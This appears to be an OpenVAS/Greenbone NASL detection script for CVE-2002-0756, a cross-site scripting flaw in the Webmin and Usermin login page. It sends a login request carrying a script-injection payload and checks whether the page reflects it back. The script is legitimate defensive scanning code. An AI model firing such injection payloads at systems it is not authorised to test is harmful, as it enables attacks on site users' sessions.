if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802258" );
	script_version( "2020-04-01T10:41:43+0000" );
	script_tag( name: "last_modification", value: "2020-04-01 10:41:43 +0000 (Wed, 01 Apr 2020)" );
	script_tag( name: "creation_date", value: "2011-10-20 08:43:23 +0200 (Thu, 20 Oct 2011)" );
	script_cve_id( "CVE-2002-0756" );
	script_bugtraq_id( 4694 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Webmin / Usermin Login Cross Site Scripting Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "webmin.sc" );
	script_require_ports( "Services/www", 10000, 20000 );
	script_mandatory_keys( "usermin_or_webmin/installed" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/9036" );
	script_xref( name: "URL", value: "http://archives.neohapsis.com/archives/bugtraq/2002-05/0040.html" );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "Webmin version 0.96 and Usermin version 0.90" );
	script_tag( name: "insight", value: "The flaw is due to improper validation of user-supplied input via the
  authentication page, which allows attackers to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site." );
	script_tag( name: "solution", value: "Upgrade to Webmin version 0.970, Usermin version 0.910 or later." );
	script_tag( name: "summary", value: "This host is running Webmin/Usermin and is prone to cross site
  scripting vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "http://www.webmin.com/download.html" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
cpe_list = make_list( "cpe:/a:webmin:usermin",
	 "cpe:/a:webmin:webmin" );
if(!infos = get_app_port_from_list( cpe_list: cpe_list )){
	exit( 0 );
}
port = infos["port"];
cpe = infos["cpe"];
if(!get_app_location( cpe: cpe, port: port, nofork: TRUE )){
	exit( 0 );
}
host = http_host_name( port: port );
postData = "page=%2F&user=%27%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&pass=";
req = NASLString( "POST /session_login.cgi HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: sid=; testing=1; user=x\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n\\r\\n", postData );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(ereg( pattern: "^HTTP/1\\.[01] 200", string: res ) && ContainsString( res, "><script>alert(document.cookie)</script>" )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

